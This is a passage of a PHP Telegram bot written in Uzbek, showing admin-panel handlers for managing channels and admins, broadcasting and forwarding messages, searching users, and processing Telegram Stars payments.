                            . "1. Kanal username to'g'rimi?\n"
                            . "2. Bot kanalga admin qilinganmi?\n"
                            . "3. Kanal ochiqmi (private emasmi)?",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Kanalni qo'shish
            if (addPublicChannel($channel_username)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Ommaviy kanal muvaffaqiyatli qo'shildi!</b>\n\n"
                            . "🌐 Kanal: @$channel_username\n"
                            . "📝 Nomi: " . ($check->result->title ?? 'Noma\'lum'),
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Bu kanal allaqachon qo'shilgan!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // MAXFIY KANAL QO'SHISH
        if ($admin_step == 'add_private') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Kanal qo'shish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            // Format: link|chat_id
            $parts = explode('|', $text);
            
            if (count($parts) != 2) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri format!</b>\n\n"
                            . "To'g'ri format: <code>link|chat_id</code>\n\n"
                            . "<b>Misol:</b> <code>https://t.me/+AbCdEfGhIjKlMnOp|-1001234567890</code>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $link = trim($parts[0]);
            $chat_id = trim($parts[1]);
            
            // Linkni tekshirish
            if (!filter_var($link, FILTER_VALIDATE_URL)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri link!</b>\n\n"
                            . "Iltimos, to'g'ri Telegram linkini kiriting.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Chat ID ni tekshirish
            if (!is_numeric($chat_id) || $chat_id >= 0) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri Chat ID!</b>\n\n"
                            . "Chat ID manfiy son bo'lishi kerak (masalan: -1001234567890).",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Kanalni qo'shish
            if (addPrivateChannel($link, $chat_id)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Maxfiy kanal muvaffaqiyatli qo'shildi!</b>\n\n"
                            . "🔗 Link: $link\n"
                            . "🆔 Chat ID: <code>$chat_id</code>\n\n"
                            . "📌 Endi foydalanuvchilar ushbu kanalga qo'shilish so'rovini yuborishlari mumkin.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Bu kanal allaqachon qo'shilgan yoki xatolik yuz berdi!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // KANAL O'CHIRISH
        if ($admin_step == 'remove_channel') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Kanal o'chirish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (!is_numeric($text)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>\n\n"
                            . "Kanal raqamini yuboring (1, 2, 3, ...)",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $index = (int)$text;
            $channels = getChannels();
            
            if ($index < 1 || $index > count($channels)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri raqam!</b>\n\n"
                            . "1 dan " . count($channels) . " gacha raqam kiriting.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Kanalni o'chirish
            if (removeChannel($index)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                $channel = $channels[$index - 1];
                $channel_name = ($channel['type'] == 'public') ? 
                    "@" . $channel['username'] : 
                    "Maxfiy kanal (ID: " . $channel['chat_id'] . ")";
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Kanal muvaffaqiyatli o'chirildi!</b>\n\n"
                            . "🗑️ O'chirilgan kanal: $channel_name",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Kanal o'chirishda xatolik!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // ========== ADMIN QO'SHISH/O'CHIRISH ==========
        
        // ADMIN QO'SHISH
        if ($admin_step == 'add_admin') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin qo'shish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (!is_numeric($text)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>\n\n"
                            . "Yangi admin ID raqamini yuboring.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $new_admin_id = $text;
            
            // Adminni qo'shish
            if (addAdmin($new_admin_id)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Yangi admin muvaffaqiyatli qo'shildi!</b>\n\n"
                            . "👤 Admin ID: <code>$new_admin_id</code>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                
                // Yangi adminga xabar
                bot('sendMessage', [
                    'chat_id' => $new_admin_id,
                    'text' => "🎉 <b>Siz botda admin huquqlariga ega bo'ldingiz!</b>\n\n"
                            . "Endi siz admin panelidan foydalanishingiz mumkin.\n"
                            . "Bot: @Shpion_bot",
                    'parse_mode' => 'HTML'
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Bu admin allaqachon qo'shilgan!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // ADMIN O'CHIRISH
        if ($admin_step == 'remove_admin') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin o'chirish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (!is_numeric($text)) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>\n\n"
                            . "O'chirilishi kerak bo'lgan admin ID raqamini yuboring.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            $admin_to_remove = $text;
            
            // Asosiy adminni o'chirish mumkin emas
            if ($admin_to_remove == $admin_id) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Asosiy adminni o'chirish mumkin emas!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
                exit();
            }
            
            // Adminni o'chirish
            if (removeAdmin($admin_to_remove)) {
                setUserStep($uid, '');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Admin muvaffaqiyatli o'chirildi!</b>\n\n"
                            . "👤 O'chirilgan admin ID: <code>$admin_to_remove</code>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Admin o'chirishda xatolik!</b>\n\n"
                            . "Bu admin mavjud emas yoki asosiy admin.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            }
            exit();
        }
        
        // ========== XABAR YUBORISH QADAMLARI ==========
        
        // BARCHAGA XABAR
        if ($admin_step == 'broadcast_all') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Xabar yuborish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            $all_file = "all_users.txt";
            $users = file_exists($all_file) ? file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
            $total = count($users);
            $success = 0;
            $failed = 0;
            
            // Xabar yuborish boshlandi deb xabar
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🔄 <b>Xabar yuborish boshlandi...</b>\n\nJami: $total ta foydalanuvchi\n⏳ Iltimos kuting...",
                'parse_mode' => 'HTML'
            ]);
            
            foreach ($users as $user_id) {
                if ($user_id == $uid) {
                    $success++;
                    continue;
                }
                
                $result = bot('sendMessage', [
                    'chat_id' => $user_id,
                    'text' => $text,
                    'parse_mode' => 'HTML'
                ]);
                
                if (isset($result->ok) && $result->ok) {
                    $success++;
                } else {
                    $failed++;
                }
                
                usleep(100000);
            }
            
            setUserStep($uid, '');
            
            // Log yozish
            logMessageSend($uid, 'broadcast_all', 'all', $text);
            
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                    [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                    [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Xabar yuborish yakunlandi!</b>\n\n"
                        . "📊 Natijalar:\n"
                        . "• Jami: $total ta\n"
                        . "✅ Muvaffaqiyatli: $success ta\n"
                        . "❌ Muvaffaqiyatsiz: $failed ta",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // BIR KISHIGA XABAR USER ID
        if ($admin_step == 'single_message_user') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Xabar yuborish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (is_numeric($text)) {
                setUserStep($uid, 'single_message_text', $text);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>User ID qabul qilindi:</b> <code>$text</code>\n\n"
                            . "📝 <b>Yubormoqchi bo'lgan xabaringizni yozing:</b>\n\n"
                            . "⚠️ HTML formatida yuborishingiz mumkin.",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri format!</b>\n\nFaqat raqam kiriting:",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
        
        // BIR KISHIGA XABAR TEXT
        if ($admin_step == 'single_message_text') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Xabar yuborish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            $target_user_id = getUserTemp($uid);
            
            $result = bot('sendMessage', [
                'chat_id' => $target_user_id,
                'text' => $text,
                'parse_mode' => 'HTML'
            ]);
            
            if (isset($result->ok) && $result->ok) {
                // Log yozish
                logMessageSend($uid, 'single_message', $target_user_id, $text);
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Xabar muvaffaqiyatli yuborildi!</b>\n\n"
                            . "👤 Kimga: <code>$target_user_id</code>\n"
                            . "📝 Xabar: " . substr($text, 0, 50) . "...",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Xabar yuborishda xatolik!</b>\n\n"
                            . "Sabab: " . ($result->description ?? 'Noma\'lum xatolik'),
                    'parse_mode' => 'HTML'
                ]);
            }
            
            setUserStep($uid, '');
            exit();
        }
        
        // ========== FORWARD XABAR QADAMLARI ==========
        
        // BARCHAGA FORWARD
        if ($admin_step == 'forward_all') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Forward xabar bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            // Bu qismda forward xabar kelishi kerak
            // Message forward qilinganmi tekshirish
            if (isset($message['forward_from']) || isset($message['forward_from_chat'])) {
                $forward_message_id = $message['message_id'];
                
                $all_file = "all_users.txt";
                $users = file_exists($all_file) ? file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
                $total = count($users);
                $success = 0;
                $failed = 0;
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "🔄 <b>Forward xabar yuborish boshlandi...</b>\n\nJami: $total ta foydalanuvchi\n⏳ Iltimos kuting...",
                    'parse_mode' => 'HTML'
                ]);
                
                foreach ($users as $user_id) {
                    if ($user_id == $uid) {
                        $success++;
                        continue;
                    }
                    
                    try {
                        $result = bot('forwardMessage', [
                            'chat_id' => $user_id,
                            'from_chat_id' => $cid,
                            'message_id' => $forward_message_id
                        ]);
                        
                        if (isset($result->ok) && $result->ok) {
                            $success++;
                        } else {
                            $failed++;
                        }
                    } catch (Exception $e) {
                        $failed++;
                    }
                    
                    usleep(100000);
                }
                
                setUserStep($uid, '');
                
                // Log yozish
                logMessageSend($uid, 'forward_all', 'all', 'Forward xabar');
                
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>Forward xabar yakunlandi!</b>\n\n"
                            . "📊 Natijalar:\n"
                            . "• Jami: $total ta\n"
                            . "✅ Muvaffaqiyatli: $success ta\n"
                            . "❌ Muvaffaqiyatsiz: $failed ta",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Forward qilingan xabar yuboring!</b>\n\n"
                            . "Iltimos, forward qilmoqchi bo'lgan xabaringizni forward qilib yuboring.",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
        
        // BIR KISHIGA FORWARD USER ID
        if ($admin_step == 'forward_single_user') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Forward xabar bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if (is_numeric($text)) {
                setUserStep($uid, 'forward_single_message', $text);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "✅ <b>User ID qabul qilindi:</b> <code>$text</code>\n\n"
                            . "📤 <b>Forward qilmoqchi bo'lgan xabaringizni yuboring:</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => backKeyboard()
                ]);
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Noto'g'ri format!</b>\n\nFaqat raqam kiriting:",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
        
        // BIR KISHIGA FORWARD MESSAGE
        if ($admin_step == 'forward_single_message') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Forward xabar bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            $target_user_id = getUserTemp($uid);
            
            // Message forward qilinganmi tekshirish
            if (isset($message['forward_from']) || isset($message['forward_from_chat'])) {
                $forward_message_id = $message['message_id'];
                
                try {
                    $result = bot('forwardMessage', [
                        'chat_id' => $target_user_id,
                        'from_chat_id' => $cid,
                        'message_id' => $forward_message_id
                    ]);
                    
                    if (isset($result->ok) && $result->ok) {
                        // Log yozish
                        logMessageSend($uid, 'forward_single', $target_user_id, 'Forward xabar');
                        
                        $panel = json_encode([
                            'resize_keyboard' => true,
                            'keyboard' => [
                                [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                                [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                                [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                            ]
                        ]);
                        
                        bot('sendMessage', [
                            'chat_id' => $cid,
                            'text' => "✅ <b>Forward xabar muvaffaqiyatli yuborildi!</b>\n\n"
                                    . "👤 Kimga: <code>$target_user_id</code>",
                            'parse_mode' => 'HTML',
                            'reply_markup' => $panel
                        ]);
                    } else {
                        bot('sendMessage', [
                            'chat_id' => $cid,
                            'text' => "❌ <b>Forward xabar yuborishda xatolik!</b>",
                            'parse_mode' => 'HTML'
                        ]);
                    }
                } catch (Exception $e) {
                    bot('sendMessage', [
                        'chat_id' => $cid,
                        'text' => "❌ <b>Forward xabar yuborishda xatolik!</b>\n\n"
                                . "Xatolik: " . $e->getMessage(),
                        'parse_mode' => 'HTML'
                    ]);
                }
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Forward qilingan xabar yuboring!</b>",
                    'parse_mode' => 'HTML'
                ]);
            }
            
            setUserStep($uid, '');
            exit();
        }
        
        // ========== QOIDA TAXRIRLASH ==========
        if ($admin_step == 'edit_rules') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin paneliga xush kelibsiz!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            file_put_contents("rules.txt", $text);
            setUserStep($uid, '');
            
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                    [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                    [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Qoidalar muvaffaqiyatli yangilandi!</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // ========== FOYDALANUVCHI QIDIRISH ==========
        if ($admin_step == 'search_user') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Admin paneliga xush kelibsiz!</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            if ($text == '/all') {
                $all_file = "all_users.txt";
                $users = file_exists($all_file) ? file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
                $total = count($users);
                
                $message = "👥 <b>Barcha foydalanuvchilar:</b>\n\n";
                $count = 0;
                foreach ($users as $user_id) {
                    $count++;
                    $message .= "$count. <code>$user_id</code>\n";
                    if ($count >= 50) {
                        $message .= "\n... va yana " . ($total - 50) . " ta";
                        break;
                    }
                }
                
                $message .= "\n\nJami: $total ta foydalanuvchi";
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ]);
                exit();
            }
            
            if (is_numeric($text)) {
                $user_data = getUserData($text);
                if ($user_data) {
                    $balance = $user_data['balance'] ?? 0;
                    $stars_balance = $user_data['stars_balance'] ?? 0;
                    $phone = $user_data['phone'] ?? 'Kiritilmagan';
                    $first_seen = date('d.m.Y H:i', strtotime($user_data['first_seen'] ?? 'now'));
                    $last_seen = date('d.m.Y H:i', strtotime($user_data['last_seen'] ?? 'now'));
                    $username = $user_data['username'] ?? 'yo\'q';
                    $name = $user_data['name'] ?? 'Noma\'lum';
                    
                    $info = "👤 <b>Foydalanuvchi ma'lumotlari</b>\n\n"
                          . "🆔 ID: <code>$text</code>\n"
                          . "👤 Ism: $name\n"
                          . "📱 Telefon: +$phone\n"
                          . "🔗 Username: @$username\n"
                          . "💰 Balans: $balance so'm\n"
                          . "⭐️ Stars balansi: $stars_balance ⭐️\n"
                          . "📅 Birinchi marta: $first_seen\n"
                          . "🕒 So'nggi faollik: $last_seen";
                    
                    bot('sendMessage', [
                        'chat_id' => $cid,
                        'text' => $info,
                        'parse_mode' => 'HTML',
                        'reply_markup' => json_encode([
                            'inline_keyboard' => [
                                [['text' => "🎁 Gift yuborish", 'callback_data' => "gift_to_user|$text"]]
                            ]
                        ])
                    ]);
                } else {
                    bot('sendMessage', [
                        'chat_id' => $cid,
                        'text' => "❌ <b>Foydalanuvchi topilmadi!</b>",
                        'parse_mode' => 'HTML'
                    ]);
                }
            } else {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Faqat raqam kiriting!</b>",
                    'parse_mode' => 'HTML'
                ]);
            }
            exit();
        }
    }
    
    // ========== DEFAULT REPLY ==========
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "Iltimos menyudan tanlang yoki /start yozing.",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    exit();
}

// ========== PRE-CHECKOUT QUERY HANDLER ==========
if ($pre_checkout_query) {
    $pre_checkout_query_id = $pre_checkout_query['id'];
    
    bot('answerPreCheckoutQuery', [
        'pre_checkout_query_id' => $pre_checkout_query_id,
        'ok' => true,
    ]);
    exit();
}

// ========== SUCCESSFUL PAYMENT HANDLER ==========
if (isset($message['successful_payment'])) {
    $successful_payment = $message['successful_payment'];
    $invoice_payload = $successful_payment['invoice_payload'];
    $ex = explode("-", $invoice_payload);
    
    if (count($ex) >= 2) {
        $amount = (int)$ex[1];
        $stars_amount = $amount * 180; // 1 ⭐️ = 180 so'm
        
        // Stars balansini yangilash
        updateStarsBalance($cid, $stars_amount);
        
        // To'lov logini yozish
        logPayment($cid, $stars_amount, $amount * 220, 'success');
        
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "<b>✅ To'lov muvaffaqiyatli amalga oshirildi!</b>\n\n"
                    . "⭐️ Qo'shilgan Stars: $stars_amount ⭐️\n"
                    . "💰 To'langan summa: " . ($amount * 220) . " so'm\n\n"
                    . "Rahmat! Endi sizning balansingizda $stars_amount ⭐️ mavjud.",
            'parse_mode' => "HTML",
            'reply_markup' => mainKeyboard(isAdmin($cid))
        ]);
        
        // Adminlarga xabar
        $admins = getAdmins();
        foreach ($admins as $admin_id) {
            bot('sendMessage', [
                'chat_id' => $admin_id,
                'text' => "💰 <b>Yangi to'lov!</b>\n\n"
                        . "👤 Foydalanuvchi: <code>$cid</code>\n"
                        . "⭐️ Stars: $stars_amount ⭐️\n"
                        . "💵 Summa: " . ($amount * 220) . " so'm\n"
